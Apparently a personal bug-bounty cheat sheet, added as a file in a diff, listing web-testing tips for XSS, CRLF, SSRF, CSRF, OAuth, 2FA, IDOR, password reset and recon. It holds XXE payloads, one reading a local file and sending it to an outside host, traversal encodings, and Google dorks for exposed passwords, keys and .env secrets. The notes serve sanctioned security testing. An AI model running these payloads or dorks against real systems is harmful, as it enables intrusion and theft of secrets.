@@ -1,0 +1,229 @@
+steps for finding params : 
+	1- params that accepts inputs * burp, waybackmachine, or webpaste from google * 
+	2- pick one vuln common params with gf   
+	3- qsreplace 
+	4- ffuf + burp to see reflects 
+	5- manual test
+
+XSS : 
+- it might be reflected in another page
+- look for common used WAF available bypasses * you have to know what is the WAF used first * 
+- be careful of CSP when executing payloads --> https://medium.com/@bhaveshthakur2015/content-security-policy-csp-bypass-techniques-e3fa475bfe5d 
+- you can get DOM XSS via JS files 
+- try to inject headers and cookies as well 
+- try unicode encoding 
+- try injecting XSS from the mobile website 
+
+CRLF : 
+- use %0d%0a after the url or in the parameter value 
+- it can lead to XSS by using many %0d%0a 
+- use utf-8 encoding 
+
+LFI and Path Traversal : 
+- use non standrad encoding such as ..%252f or ..%c0%af
+
+SSRF : 
+- common ssrf bypasses
+
+SSTI : 
+- tplmap => https://discord.com/channels/698511404906315916/701877357862060122/800072953618235412
+
+CSRF : 
+- use PoC generator and dont forget to modify the options 
+- try removing the CSRF token param
+- CSRF token is maybe not tied to the user session 
+- if the site uses referrer for validating use this ---> <meta name="referrer" content="never">
+- sometimes the csrf token can be leaked in the referrer 
+
+Blind XSS :
+- same params automation steps
+- xss hunter payloads * through user agent maybe * 
+- dalfox 
+
+Blind SSRF : 
+- same params automation steps 
+- you can replace params with burp collaporator 
+- collaporator everything extension 
+
+XXE : 
+- check any param that greps results from api 
+- try external entity 
+- copy paste : - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "path to file">]>
+	- 	  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://7x5pwosxm9dlbtuwetxsury5jwpodd.burpcollaborator.net">]>
+	
+	-	  <!ENTITY % file SYSTEM "file:///etc/hostname">
+		  <!ENTITY % eval "<!ENTITY &-x25; exfilter SYSTEM 'https://acd61f431f8300a58058250201980069.web-security-academy.net/exploit/?x=%file;'>">
+		  %eval;
+		  %exfilter;
+
+Http Request Smuggling : 
+- usually automated 
+
+Information Disclosure : 
+- u can automate a tool to put ~ or .old at the end of the extensions for source code disclosure or backup files  
+- guess the wordlist based on the files that already exist
+- force browse throguh 403 pages
+- JS files 
+- look for common paths for used technology
+- burp --> engagement tools --> find comments * or do it manually * 
+
+Cool Exstensions :  
+- zip,gz,tar,bak,old,js,html,php,php~,git,tgz,sql,rar,jsp,aspx,asp,sh,jar,yml,txt  
+- you can identify extensions based on used technology 
+
+403, 401 bypasses : 
+- https://www.infosecmatter.com/bug-bounty-tips-9-nov-16/-1_bypass_403_errors_by_traversing_deeper
+- https://github.com/KathanP19/HowToHunt/blob/master/Status_Code_Bypass/403Bypass.md
+- if u get a redirect from /admin try %20
+
+
+Waybackmachine : 
+- https://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=text&fl=original&collapse=urlkey
+
+JS Files : 
+- extract with subjs 
+- curl -s then use secretfinder and linkfinder
+- you can find important endpoints for iformation disclosure 
+- search for sourceMappingURL
+- search for leaked api keys..etc
+
+FFUF : 
+- ffuf -w js_files.txt -u FUZZ -mr "sourceMappingURL"
+- ffuf -w /root/BugBounty/realme.com/gau_js.txt -t 100 -u FUZZ -mr "https://maps.googleapis.com/maps/api/js?"
+
+
+AWS : 
+- unauthinticated AWS enumertaion https://rhinosecuritylabs.com/aws/aws-role-enumeration-iam-p2/
+- https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3
+
+Register Page : 
+- DOS => {
+	- extremely long password 
+	- add unlimitied users 
+ }
+- Email Verification ==> https://docs.google.com/spreadsheets/d/1TxNrvaIMRS_dmupcwjwJmXtaFk_lPGE1LzgxPu_7KqA/htmlview#
+- Bypassing username verifcation 
+- Different kind of injections + blind injection 
+
+OAuth :
+- try replacing tokens with valid ones  
+- redirect_uri --> {
+	for open redirection {
+			- IDN homograph attack
+			- unicode
+			- another open redirection within the same domain  
+		}; 
+	path traversal;
+	}
+- state --> if missing or static : try CSRF * try adding %00 in the state * 
+- check if there's no email verification
+- be aware of leaked client_secret and client_id 
+
+Rate Limit : 
+- if there's a rate limit try to see what generates the limit and play with it * change headers...etc * 
+- if you found internal IP address you can use it to bypass rate limit 
+- try adding /n after email 
+- rate limits are not just in login pages !, try searching for them in the different funcs 
+- rate limit for change password field 
+- rate limiting for spamming emails, u can also try bypassing recaptcha
+
+Password Reset : 
+- host header injection in forgot password  
+- password reset link doesn't expire or u can use it after changing the email 
+- token is not random or unchecked 
+- the token is leaked in the refferer header when clicking on social media button 
+- u can change password without knowing the current password
+- session token is not destroyed after changing the password 
+- unverified password change 
+- if you found Cross domain referrer leakage in burp you know what to do :v
+
+IDOR : 
+- you can use firefox containers for multiple accounts login  
+- test functionalities * CRUD (Create Read Update Delete) * and test for little used functionalities in the app 
+- it doesn't have to be a sequence of numbers, it can be hash or string 
+- try to capture the identifier of the user who requests for a func and play with it
+- test for unauthorized CRUD   
+- replace cookies with authorize tool 
+
+2FA : 
+- check if it's actually missing * high risk of N/A , informative *
+- send blank OTP from burpsuite 
+- sometimes you can login even after you enabled 2FA from your account 
+- play with enabling and disabling 2FA * might feel like an idor * 
+- try to bypass using Email confirmation link if it doesn't expire 
+- 2FA Code Leakage in Response
+- Lack of Brute-Force Protection * no rate-limiting...etc * 
+- try to bypass OTP by using another account's valid OTP 
+- make a direct request to the page that displays after successful 2FA * try to add the url to the referrer header *
+- Enabling 2FA Doesn't Expire Previous Session * depends on program policy *
+- CSRF on 2FA Disable Feature
+- 2FA Code Reusability * not recommended *
+- Status Code and Response manipulation if you see {"success": false} in the body or a 4XX status code 
+- Clickjacking on disable button * not really recommended * 
+
+JWT : 
+- https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
+
+Dorks For recon * remember to try it on different search engines * 
+	- Login panel search
+	site:target.com inurl:admin | administrator | adm | login | l0gin | wp-login | wp-admin
+	- Login panel search -2
+	intitle:"login" "admin" site:target.com
+	- Admin panel search
+	inurl:admin site:target.com
+	- Search for our target's exposed files
+	site:target.com ext:txt | ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:mdb
+	- Get open directories (index of)
+	intitle:"index of /" Parent Directory site:target.com
+	- Search for exposed admin directories
+	intitle:"index of /admin" site:target.com
+	- Search for exposed password directories
+	intitle:"index of /password" site:target.com
+	- Search for directories with mail
+	intitle:"index of /mail" site:target.com
+	- Search for directories containing passwords
+	intitle:"index of /" (passwd | password.txt) site:target.com
+	- Search for directories containing .htaccess
+	intitle:"index of /" .htaccess site:target.com
+	- Search for .txt files with passwords
+	inurl:passwd filetype:txt site:target.com
+	- Search for potentially sensitive database files
+	inurl:admin filetype:db site:target.com
+	- Search for log files
+	filetype:log site:target.com
+	- Search for other sites that are linking to our target
+	link:target.com -site:target.com
+	- inurl:example.com intitle:"index of"
+	- inurl:example.com intitle:"index of /" "*key.pem"
+	- inurl:example.com ext:log
+	- inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
+	- inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
+	- site:target.com inurl:admin | administrator | adm | login | l0gin | wp-login
+	- intitle:"login" "admin" site:target.com
+	- inurl:admin site:target.com
+	- site:target.com ext:txt | ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:mdb
+	- intitle:"index of /" Parent Directory site:target.com
+	- intitle:"index of /admin" site:target.com
+	- intitle:"index of /password" site:target.com
+	- intitle:"index of /mail" site:target.com
+	- intitle:"index of /" (passwd | password.txt) site:target.com
+	- intitle:"index of /" .htaccess site:target.com
+	- inurl:passwd filetype:txt site:target.com
+	- inurl:admin filetype:db site:target.com
+	- filetype:log site:target.com
+	- link:target.com -site:target.com
+	- "http://acme.com" dotfiles
+	- "http://acme.com" authorizationToken
+	- "http://acme.com" access_token
+	- "http://acme.com" secret_key
+
+
+Github Dorks : 
+- https://orwaatyat.medium.com/your-full-map-to-github-recon-and-leaks-exposure-860c37ca2c82
+
+
+
+
+Later use maybe : 
+
+- for i in $(cat BugBounty/binance.org/domains.txt); do dig $i | grep CNAME; done | awk '{ print $1 " --->  " $5 }'  
